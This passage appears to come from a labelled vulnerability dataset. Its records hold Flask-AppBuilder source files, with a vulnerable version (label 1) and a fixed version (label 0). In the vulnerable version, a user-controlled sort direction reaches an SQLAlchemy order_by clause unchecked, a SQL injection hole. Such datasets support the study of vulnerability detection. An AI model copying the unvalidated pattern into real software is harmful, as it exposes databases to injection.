re_match:\n            orders[re_match[0]] = (request.args.get(arg), request.args.get('_od_' + re_match[0]))\n    return orders\n\ndef get_filter_args(filters):\n    filters.clear_filters()\n    for arg in request.args:\n        re_match = re.findall('_flt_(\\d)_(.*)', arg)\n        if re_match:\n            filters.add_filter_index(re_match[0][1], int(re_match[0][0]), request.args.get(arg))\n/n/n/n", "label": 1}, {"id": "2158db051408e0d66210a99b17c121be008e20b6", "code": "flask_appbuilder/models/sqla/interface.py/n/n# -*- coding: utf-8 -*-\nimport sys\nimport logging\nimport sqlalchemy as sa\n\nfrom . import filters\nfrom sqlalchemy.orm import joinedload\nfrom sqlalchemy.exc import IntegrityError\nfrom sqlalchemy import func\nfrom sqlalchemy.orm.properties import SynonymProperty\n\nfrom ..base import BaseInterface\nfrom ..group import GroupByDateYear, GroupByDateMonth, GroupByCol\nfrom ..mixins import FileColumn, ImageColumn\nfrom ...filemanager import FileManager, ImageManager\nfrom ..._compat import as_unicode\nfrom ...const import LOGMSG_ERR_DBI_ADD_GENERIC, LOGMSG_ERR_DBI_EDIT_GENERIC, LOGMSG_ERR_DBI_DEL_GENERIC, \\\n    LOGMSG_WAR_DBI_ADD_INTEGRITY, LOGMSG_WAR_DBI_EDIT_INTEGRITY, LOGMSG_WAR_DBI_DEL_INTEGRITY\n\nlog = logging.getLogger(__name__)\n\n\ndef _include_filters(obj):\n    for key in filters.__all__:\n        if not hasattr(obj, key):\n            setattr(obj, key, getattr(filters, key))\n\n\nclass SQLAInterface(BaseInterface):\n    \"\"\"\n    SQLAModel\n    Implements SQLA support methods for views\n    \"\"\"\n    session = None\n\n    filter_converter_class = filters.SQLAFilterConverter\n\n    def __init__(self, obj, session=None):\n        _include_filters(self)\n        self.list_columns = dict()\n        self.list_properties = dict()\n\n        self.session = session\n        # Collect all SQLA columns and properties\n        for prop in sa.orm.class_mapper(obj).iterate_properties:\n            if type(prop) != SynonymProperty:\n                self.list_properties[prop.key] = prop\n        for col_name in obj.__mapper__.columns.keys():\n            if col_name in self.list_properties:\n                self.list_columns[col_name] = obj.__mapper__.columns[col_name]\n        super(SQLAInterface, self).__init__(obj)\n\n    @property\n    def model_name(self):\n        \"\"\"\n            Returns the models class name\n            useful for auto title on views\n        \"\"\"\n        return self.obj.__name__\n\n    def _get_base_query(self, query=None, filters=None, order_column='', order_direction=''):\n        if filters:\n            query = filters.apply_all(query)\n        if order_column != '':\n            # if Model has custom decorator **renders('<COL_NAME>')**\n            # this decorator will add a property to the method named *_col_name*\n            if hasattr(self.obj, order_column):\n                if hasattr(getattr(self.obj, order_column), '_col_name'):\n                    order_column = getattr(getattr(self.obj, order_column), '_col_name')\n            query = query.order_by(\"%s %s\" % (order_column, order_direction))\n        return query\n\n    def query(self, filters=None, order_column='', order_direction='',\n              page=None, page_size=None):\n        \"\"\"\n            QUERY\n            :param filters:\n                dict with filters {<col_name>:<value,...}\n            :param order_column:\n                name of the column to order\n            :param order_direction:\n                the direction to order <'asc'|'desc'>\n            :param page:\n                the current page\n            :param page_size:\n                the current page size\n\n        \"\"\"\n        query = self.session.query(self.obj)\n        if len(order_column.split('.')) >= 2:\n            tmp_order_column = ''\n            for join_relation in order_column.split('.')[:-1]:\n                model_relation = self.get_related_model(join_relation)\n                query = query.join(model_relation)\n                # redefine order column name, because relationship can have a different name\n                # from the related table name.\n                tmp_order_column = tmp_order_column + model_relation.__tablename__ + '.'\n            order_column = tmp_order_column + order_column.split('.')[-1]\n        query_count = self.session.query(func.count('*')).select_from(self.obj)\n\n        query_count = self._get_base_query(query=query_count,\n                                           filters=filters)\n        query = self._get_base_query(query=query,\n                                     filters=filters,\n                                     order_column=order_column,\n                                     order_direction=order_direction)\n\n        count = query_count.scalar()\n\n        if page:\n            query = query.offset(page * page_size)\n        if page_size:\n            query = query.limit(page_size)\n\n        return count, query.all()\n\n    def query_simple_group(self, group_by='', aggregate_func=None, aggregate_col=None, filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group = GroupByCol(group_by, 'Group by')\n        return group.apply(query_result)\n\n    def query_month_group(self, group_by='', filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group = GroupByDateMonth(group_by, 'Group by Month')\n        return group.apply(query_result)\n\n    def query_year_group(self, group_by='', filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group_year = GroupByDateYear(group_by, 'Group by Year')\n        return group_year.apply(query_result)\n\n    \"\"\"\n    -----------------------------------------\n         FUNCTIONS for Testing TYPES\n    -----------------------------------------\n    \"\"\"\n\n    def is_image(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, ImageColumn)\n        except:\n            return False\n\n    def is_file(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, FileColumn)\n        except:\n            return False\n\n    def is_string(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.String)\n        except:\n            return False\n\n    def is_text(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Text)\n        except:\n            return False\n\n    def is_integer(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Integer)\n        except:\n            return False\n\n    def is_numeric(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Numeric)\n        except:\n            return False\n\n    def is_float(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Float)\n        except:\n            return False\n\n    def is_boolean(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Boolean)\n        except:\n            return False\n\n    def is_date(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Date)\n        except:\n            return False\n\n    def is_datetime(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.DateTime)\n        except:\n            return False\n\n    def is_relation(self, col_name):\n        try:\n            return isinstance(self.list_properties[col_name], sa.orm.properties.RelationshipProperty)\n        except:\n            return False\n\n    def is_relation_many_to_one(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'MANYTOONE'\n        except:\n            return False\n\n    def is_relation_many_to_many(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'MANYTOMANY'\n        except:\n            return False\n\n    def is_relation_one_to_one(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'ONETOONE'\n        except:\n            return False\n\n    def is_relation_one_to_many(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'ONETOMANY'\n        except:\n            return False\n\n    def is_nullable(self, col_name):\n        if self.is_relation_many_to_one(col_name):\n            col = self.get_relation_fk(col_name)\n            return col.nullable\n        try:\n            return self.list_columns[col_name].nullable\n        except:\n            return False\n\n    def is_unique(self, col_name):\n        try:\n            return self.list_columns[col_name].unique\n        except:\n            return False\n\n    def is_pk(self, col_name):\n        try:\n            return self.list_columns[col_name].primary_key\n        except:\n            return False\n\n    def is_fk(self, col_name):\n        try:\n            return self.list_columns[col_name].foreign_keys\n        except:\n            return False\n\n    def get_max_length(self, col_name):\n        try:\n            col = self.list_columns[col_name]\n            if col.type.length:\n                return col.type.length\n            else:\n                return -1\n        except:\n            return -1\n\n    \"\"\"\n    -------------------------------\n     FUNCTIONS FOR CRUD OPERATIONS\n    -------------------------------\n    \"\"\"\n\n    def add(self, item):\n        try:\n            self.session.add(item)\n            self.session.commit()\n            self.message = (as_unicode(self.add_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.add_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_ADD_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_ADD_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def edit(self, item):\n        try:\n            self.session.merge(item)\n            self.session.commit()\n            self.message = (as_unicode(self.edit_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.edit_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_EDIT_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_EDIT_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def delete(self, item):\n        try:\n            self._delete_files(item)\n            self.session.delete(item)\n            self.session.commit()\n            self.message = (as_unicode(self.delete_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def delete_all(self, items):\n        try:\n            for item in items:\n                self._delete_files(item)\n                self.session.delete(item)\n            self.session.commit()\n            self.message = (as_unicode(self.delete_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    \"\"\"\n    -----------------------\n     FILE HANDLING METHODS\n    -----------------------\n    \"\"\"\n\n    def _add_files(self, this_request, item):\n        fm = FileManager()\n        im = ImageManager()\n        for file_col in this_request.files:\n            if self.is_file(file_col):\n                fm.save_file(this_request.files[file_col], getattr(item, file_col))\n        for file_col in this_request.files:\n            if self.is_image(file_col):\n                im.save_file(this_request.files[file_col], getattr(item, file_col))\n\n    def _delete_files(self, item):\n        for file_col in self.get_file_column_list():\n            if self.is_file(file_col):\n                if getattr(item, file_col):\n                    fm = FileManager()\n                    fm.delete_file(getattr(item, file_col))\n        for file_col in self.get_image_column_list():\n            if self.is_image(file_col):\n                if getattr(item, file_col):\n                    im = ImageManager()\n                    im.delete_file(getattr(item, file_col))\n\n    \"\"\"\n    ------------------------------\n     FUNCTIONS FOR RELATED MODELS\n    ------------------------------\n    \"\"\"\n\n    def get_col_default(self, col_name):\n        default = getattr(self.list_columns[col_name], 'default', None)\n        if default is not None:\n            value = getattr(default, 'arg', None)\n            if value is not None:\n                if getattr(default, 'is_callable', False):\n                    return lambda: default.arg(None)\n                else:\n                    if not getattr(default, 'is_scalar', True):\n                        return None\n                return value\n\n    def get_related_model(self, col_name):\n        return self.list_properties[col_name].mapper.class_\n\n    def query_model_relation(self, col_name):\n        model = self.get_related_model(col_name)\n        return self.session.query(model).all()\n\n    def get_related_interface(self, col_name):\n        return self.__class__(self.get_related_model(col_name), self.session)\n\n    def get_related_obj(self, col_name, value):\n        rel_model = self.get_related_model(col_name)\n        return self.session.query(rel_model).get(value)\n\n    def get_related_fks(self, related_views):\n        return [view.datamodel.get_related_fk(self.obj) for view in related_views]\n\n    def get_related_fk(self, model):\n        for col_name in self.list_properties.keys():\n            if self.is_relation(col_name):\n                if model == self.get_related_model(col_name):\n                    return col_name\n\n    \"\"\"\n    ------------- \n     GET METHODS\n    -------------\n    \"\"\"\n\n    def get_columns_list(self):\n        \"\"\"\n            Returns all model's columns on SQLA properties\n        \"\"\"\n        return list(self.list_properties.keys())\n\n    def get_user_columns_list(self):\n        \"\"\"\n            Returns all model's columns except pk or fk\n        \"\"\"\n        ret_lst = list()\n        for col_name in self.get_columns_list():\n            if (not self.is_pk(col_name)) and (not self.is_fk(col_name)):\n                ret_lst.append(col_name)\n        return ret_lst\n\n    # TODO get different solution, more integrated with filters\n    def get_search_columns_list(self):\n        ret_lst = list()\n        for col_name in self.get_columns_list():\n            if not self.is_relation(col_name):\n                tmp_prop = self.get_property_first_col(col_name).name\n                if (not self.is_pk(tmp_prop)) and \\\n                        (not self.is_fk(tmp_prop)) and \\\n                        (not self.is_image(col_name)) and \\\n                        (not self.is_file(col_name)) and \\\n                        (not self.is_boolean(col_name)):\n                    ret_lst.append(col_name)\n            else:\n                ret_lst.append(col_name)\n        return ret_lst\n\n    def get_order_columns_list(self, list_columns=None):\n        \"\"\"\n            Returns the columns that can be ordered\n\n            :param list_columns: optional list of columns name, if provided will\n                use this list only.\n        \"\"\"\n        ret_lst = list()\n        list_columns = list_columns or self.get_columns_list()\n        for col_name in list_columns:\n            if not self.is_relation(col_name):\n                if hasattr(self.obj, col_name):\n                    if (not hasattr(getattr(self.obj, col_name), '__call__') or\n                            hasattr(getattr(self.obj, col_name), '_col_name')):\n                        ret_lst.append(col_name)\n                else:\n                    ret_lst.append(col_name)\n        return ret_lst\n\n    def get_file_column_list(self):\n        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, FileColumn)]\n\n    def get_image_column_list(self):\n        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, ImageColumn)]\n\n    def get_property_first_col(self, col_name):\n        # support for only one col for pk and fk\n        return self.list_properties[col_name].columns[0]\n\n    def get_relation_fk(self, col_name):\n        # support for only one col for pk and fk\n        return list(self.list_properties[col_name].local_columns)[0]\n\n    def get(self, id, filters=None):\n        if filters:\n            query = query = self.session.query(self.obj)\n            _filters = filters.copy()\n            _filters.add_filter(self.get_pk_name(), self.FilterEqual, id)\n            query = self._get_base_query(query=query, filters=_filters)\n            return query.first()\n        return self.session.query(self.obj).get(id)\n\n    def get_pk_name(self):\n        for col_name in self.list_columns.keys():\n            if self.is_pk(col_name):\n                return col_name\n\n\n\"\"\"\n    For Retro-Compatibility\n\"\"\"\nSQLModel = SQLAInterface\n/n/n/nflask_appbuilder/urltools.py/n/nimport re\nfrom flask import request\n\n\nclass Stack(object):\n    \"\"\"\n        Stack data structure will not insert\n        equal sequential data\n    \"\"\"\n    def __init__(self, list=None, size=5):\n        self.size = size\n        self.data = list or []\n\n    def push(self, item):\n        if self.data:\n            if item != self.data[len(self.data) - 1]:\n                self.data.append(item)\n        else:\n            self.data.append(item)\n        if len(self.data) > self.size:\n            self.data.pop(0)\n\n    def pop(self):\n        if len(self.data) == 0:\n            return None\n        return self.data.pop(len(self.data) - 1)\n\n    def to_json(self):\n        return self.data\n\n\ndef get_group_by_args():\n    \"\"\"\n        Get page arguments for group by\n    \"\"\"\n    group_by = request.args.get('group_by')\n    if not group_by: group_by = ''\n    return group_by\n\n\ndef get_page_args():\n    \"\"\"\n        Get page arguments, returns a dictionary\n        { <VIEW_NAME>: PAGE_NUMBER }\n\n        Arguments are passed: page_<VIEW_NAME>=<PAGE_NUMBER>\n\n    \"\"\"\n    pages = {}\n    for arg in request.args:\n        re_match = re.findall('page_(.*)', arg)\n        if re_match:\n            pages[re_match[0]] = int(request.args.get(arg))\n    return pages\n\n\ndef get_page_size_args():\n    \"\"\"\n        Get page size arguments, returns an int\n        { <VIEW_NAME>: PAGE_NUMBER }\n\n        Arguments are passed: psize_<VIEW_NAME>=<PAGE_SIZE>\n\n    \"\"\"\n    page_sizes = {}\n    for arg in request.args:\n        re_match = re.findall('psize_(.*)', arg)\n        if re_match:\n            page_sizes[re_match[0]] = int(request.args.get(arg))\n    return page_sizes\n\n\ndef get_order_args():\n    \"\"\"\n        Get order arguments, return a dictionary\n        { <VIEW_NAME>: (ORDER_COL, ORDER_DIRECTION) }\n\n        Arguments are passed like: _oc_<VIEW_NAME>=<COL_NAME>&_od_<VIEW_NAME>='asc'|'desc'\n\n    \"\"\"\n    orders = {}\n    for arg in request.args:\n        re_match = re.findall('_oc_(.*)', arg)\n        if re_match:\n            order_direction = request.args.get('_od_' + re_match[0])\n            if order_direction in ('asc', 'desc'):\n                orders[re_match[0]] = (request.args.get(arg), order_direction)\n    return orders\n\n\ndef get_filter_args(filters):\n    filters.clear_filters()\n    for arg in request.args:\n        re_match = re.findall('_flt_(\\d)_(.*)', arg)\n        if re_match:\n            filters.add_filter_index(re_match[0][1], int(re_match[0][0]), request.args.get(arg))\n/n/n/n", "label": 0}, {"id": "2158db051408e0d66210a99b17c121be008e20b6", "code": "/flask_appbuilder/models/sqla/interface.py/n/n# -*- coding: utf-8 -*-\nimport sys\nimport logging\nimport sqlalchemy as sa\n\nfrom . import filters\nfrom sqlalchemy.orm import joinedload\nfrom sqlalchemy.exc import IntegrityError\nfrom sqlalchemy import func\nfrom sqlalchemy.orm.properties import SynonymProperty\n\nfrom ..base import BaseInterface\nfrom ..group import GroupByDateYear, GroupByDateMonth, GroupByCol\nfrom ..mixins import FileColumn, ImageColumn\nfrom ...filemanager import FileManager, ImageManager\nfrom ..._compat import as_unicode\nfrom ...const import LOGMSG_ERR_DBI_ADD_GENERIC, LOGMSG_ERR_DBI_EDIT_GENERIC, LOGMSG_ERR_DBI_DEL_GENERIC, \\\n    LOGMSG_WAR_DBI_ADD_INTEGRITY, LOGMSG_WAR_DBI_EDIT_INTEGRITY, LOGMSG_WAR_DBI_DEL_INTEGRITY\n\nlog = logging.getLogger(__name__)\n\n\ndef _include_filters(obj):\n    for key in filters.__all__:\n        if not hasattr(obj, key):\n            setattr(obj, key, getattr(filters, key))\n\n\nclass SQLAInterface(BaseInterface):\n    \"\"\"\n    SQLAModel\n    Implements SQLA support methods for views\n    \"\"\"\n    session = None\n\n    filter_converter_class = filters.SQLAFilterConverter\n\n    def __init__(self, obj, session=None):\n        _include_filters(self)\n        self.list_columns = dict()\n        self.list_properties = dict()\n\n        self.session = session\n        # Collect all SQLA columns and properties\n        for prop in sa.orm.class_mapper(obj).iterate_properties:\n            if type(prop) != SynonymProperty:\n                self.list_properties[prop.key] = prop\n        for col_name in obj.__mapper__.columns.keys():\n            if col_name in self.list_properties:\n                self.list_columns[col_name] = obj.__mapper__.columns[col_name]\n        super(SQLAInterface, self).__init__(obj)\n\n    @property\n    def model_name(self):\n        \"\"\"\n            Returns the models class name\n            useful for auto title on views\n        \"\"\"\n        return self.obj.__name__\n\n    def _get_base_query(self, query=None, filters=None, order_column='', order_direction=''):\n        if filters:\n            query = filters.apply_all(query)\n        if order_column != '':\n            # if Model has custom decorator **renders('<COL_NAME>')**\n            # this decorator will add a property to the method named *_col_name*\n            if hasattr(self.obj, order_column):\n                if hasattr(getattr(self.obj, order_column), '_col_name'):\n                    order_column = getattr(getattr(self.obj, order_column), '_col_name')\n            query = query.order_by(order_column + ' ' + order_direction)\n        return query\n\n    def query(self, filters=None, order_column='', order_direction='',\n              page=None, page_size=None):\n        \"\"\"\n            QUERY\n            :param filters:\n                dict with filters {<col_name>:<value,...}\n            :param order_column:\n                name of the column to order\n            :param order_direction:\n                the direction to order <'asc'|'desc'>\n            :param page:\n                the current page\n            :param page_size:\n                the current page size\n\n        \"\"\"\n        query = self.session.query(self.obj)\n        if len(order_column.split('.')) >= 2:\n            tmp_order_column = ''\n            for join_relation in order_column.split('.')[:-1]:\n                model_relation = self.get_related_model(join_relation)\n                query = query.join(model_relation)\n                # redefine order column name, because relationship can have a different name\n                # from the related table name.\n                tmp_order_column = tmp_order_column + model_relation.__tablename__ + '.'\n            order_column = tmp_order_column + order_column.split('.')[-1]\n        query_count = self.session.query(func.count('*')).select_from(self.obj)\n\n        query_count = self._get_base_query(query=query_count,\n                                           filters=filters)\n        query = self._get_base_query(query=query,\n                                     filters=filters,\n                                     order_column=order_column,\n                                     order_direction=order_direction)\n\n        count = query_count.scalar()\n\n        if page:\n            query = query.offset(page * page_size)\n        if page_size:\n            query = query.limit(page_size)\n\n        return count, query.all()\n\n    def query_simple_group(self, group_by='', aggregate_func=None, aggregate_col=None, filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group = GroupByCol(group_by, 'Group by')\n        return group.apply(query_result)\n\n    def query_month_group(self, group_by='', filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group = GroupByDateMonth(group_by, 'Group by Month')\n        return group.apply(query_result)\n\n    def query_year_group(self, group_by='', filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group_year = GroupByDateYear(group_by, 'Group by Year')\n        return group_year.apply(query_result)\n\n    \"\"\"\n    -----------------------------------------\n         FUNCTIONS for Testing TYPES\n    -----------------------------------------\n    \"\"\"\n\n    def is_image(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, ImageColumn)\n        except:\n            return False\n\n    def is_file(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, FileColumn)\n        except:\n            return False\n\n    def is_string(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.String)\n        except:\n            return False\n\n    def is_text(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Text)\n        except:\n            return False\n\n    def is_integer(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Integer)\n        except:\n            return False\n\n    def is_numeric(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Numeric)\n        except:\n            return False\n\n    def is_float(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Float)\n        except:\n            return False\n\n    def is_boolean(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Boolean)\n        except:\n            return False\n\n    def is_date(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Date)\n        except:\n            return False\n\n    def is_datetime(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.DateTime)\n        except:\n            return False\n\n    def is_relation(self, col_name):\n        try:\n            return isinstance(self.list_properties[col_name], sa.orm.properties.RelationshipProperty)\n        except:\n            return False\n\n    def is_relation_many_to_one(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'MANYTOONE'\n        except:\n            return False\n\n    def is_relation_many_to_many(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'MANYTOMANY'\n        except:\n            return False\n\n    def is_relation_one_to_one(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'ONETOONE'\n        except:\n            return False\n\n    def is_relation_one_to_many(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'ONETOMANY'\n        except:\n            return False\n\n    def is_nullable(self, col_name):\n        if self.is_relation_many_to_one(col_name):\n            col = self.get_relation_fk(col_name)\n            return col.nullable\n        try:\n            return self.list_columns[col_name].nullable\n        except:\n            return False\n\n    def is_unique(self, col_name):\n        try:\n            return self.list_columns[col_name].unique\n        except:\n            return False\n\n    def is_pk(self, col_name):\n        try:\n            return self.list_columns[col_name].primary_key\n        except:\n            return False\n\n    def is_fk(self, col_name):\n        try:\n            return self.list_columns[col_name].foreign_keys\n        except:\n            return False\n\n    def get_max_length(self, col_name):\n        try:\n            col = self.list_columns[col_name]\n            if col.type.length:\n                return col.type.length\n            else:\n                return -1\n        except:\n            return -1\n\n    \"\"\"\n    -------------------------------\n     FUNCTIONS FOR CRUD OPERATIONS\n    -------------------------------\n    \"\"\"\n\n    def add(self, item):\n        try:\n            self.session.add(item)\n            self.session.commit()\n            self.message = (as_unicode(self.add_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.add_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_ADD_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_ADD_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def edit(self, item):\n        try:\n            self.session.merge(item)\n            self.session.commit()\n            self.message = (as_unicode(self.edit_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.edit_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_EDIT_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_EDIT_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def delete(self, item):\n        try:\n            self._delete_files(item)\n            self.session.delete(item)\n            self.session.commit()\n            self.message = (as_unicode(self.delete_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def delete_all(self, items):\n        try:\n            for item in items:\n                self._delete_files(item)\n                self.session.delete(item)\n            self.session.commit()\n            self.message = (as_unicode(self.delete_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    \"\"\"\n    -----------------------\n     FILE HANDLING METHODS\n    -----------------------\n    \"\"\"\n\n    def _add_files(self, this_request, item):\n        fm = FileManager()\n        im = ImageManager()\n        for file_col in this_request.files:\n            if self.is_file(file_col):\n                fm.save_file(this_request.files[file_col], getattr(item, file_col))\n        for file_col in this_request.files:\n            if self.is_image(file_col):\n                im.save_file(this_request.files[file_col], getattr(item, file_col))\n\n    def _delete_files(self, item):\n        for file_col in self.get_file_column_list():\n            if self.is_file(file_col):\n                if getattr(item, file_col):\n                    fm = FileManager()\n                    fm.delete_file(getattr(item, file_col))\n        for file_col in self.get_image_column_list():\n            if self.is_image(file_col):\n                if getattr(item, file_col):\n                    im = ImageManager()\n                    im.delete_file(getattr(item, file_col))\n\n    \"\"\"\n    ------------------------------\n     FUNCTIONS FOR RELATED MODELS\n    ------------------------------\n    \"\"\"\n\n    def get_col_default(self, col_name):\n        default = getattr(self.list_columns[col_name], 'default', None)\n        if default is not None:\n            value = getattr(default, 'arg', None)\n            if value is not None:\n                if getattr(default, 'is_callable', False):\n                    return lambda: default.arg(None)\n                else:\n                    if not getattr(default, 'is_scalar', True):\n                        return None\n                return value\n\n    def get_related_model(self, col_name):\n        return self.list_properties[col_name].mapper.class_\n\n    def query_model_relation(self, col_name):\n        model = self.get_related_model(col_name)\n        return self.session.query(model).all()\n\n    def get_related_interface(self, col_name):\n        return self.__class__(self.get_related_model(col_name), self.session)\n\n    def get_related_obj(self, col_name, value):\n        rel_model = self.get_related_model(col_name)\n        return self.session.query(rel_model).get(value)\n\n    def get_related_fks(self, related_views):\n        return [view.datamodel.get_related_fk(self.obj) for view in related_views]\n\n    def get_related_fk(self, model):\n        for col_name in self.list_properties.keys():\n            if self.is_relation(col_name):\n                if model == self.get_related_model(col_name):\n                    return col_name\n\n    \"\"\"\n    ------------- \n     GET METHODS\n    -------------\n    \"\"\"\n\n    def get_columns_list(self):\n        \"\"\"\n            Returns all model's columns on SQLA properties\n        \"\"\"\n        return list(self.list_properties.keys())\n\n    def get_user_columns_list(self):\n        \"\"\"\n            Returns all model's columns except pk or fk\n        \"\"\"\n        ret_lst = list()\n        for col_name in self.get_columns_list():\n            if (not self.is_pk(col_name)) and (not self.is_fk(col_name)):\n                ret_lst.append(col_name)\n        return ret_lst\n\n    # TODO get different solution, more integrated with filters\n    def get_search_columns_list(self):\n        ret_lst = list()\n        for col_name in self.get_columns_list():\n            if not self.is_relation(col_name):\n                tmp_prop = self.get_property_first_col(col_name).name\n                if (not self.is_pk(tmp_prop)) and \\\n                        (not self.is_fk(tmp_prop)) and \\\n                        (not self.is_image(col_name)) and \\\n                        (not self.is_file(col_name)) and \\\n                        (not self.is_boolean(col_name)):\n                    ret_lst.append(col_name)\n            else:\n                ret_lst.append(col_name)\n        return ret_lst\n\n    def get_order_columns_list(self, list_columns=None):\n        \"\"\"\n            Returns the columns that can be ordered\n\n            :param list_columns: optional list of columns name, if provided will\n                use this list only.\n        \"\"\"\n        ret_lst = list()\n        list_columns = list_columns or self.get_columns_list()\n        for col_name in list_columns:\n            if not self.is_relation(col_name):\n                if hasattr(self.obj, col_name):\n                    if (not hasattr(getattr(self.obj, col_name), '__call__') or\n                            hasattr(getattr(self.obj, col_name), '_col_name')):\n                        ret_lst.append(col_name)\n                else:\n                    ret_lst.append(col_name)\n        return ret_lst\n\n    def get_file_column_list(self):\n        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, FileColumn)]\n\n    def get_image_column_list(self):\n        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, ImageColumn)]\n\n    def get_property_first_col(self, col_name):\n        # support for only one col for pk and fk\n        return self.list_properties[col_name].columns[0]\n\n    def get_relation_fk(self, col_name):\n        # support for only one col for pk and fk\n        return 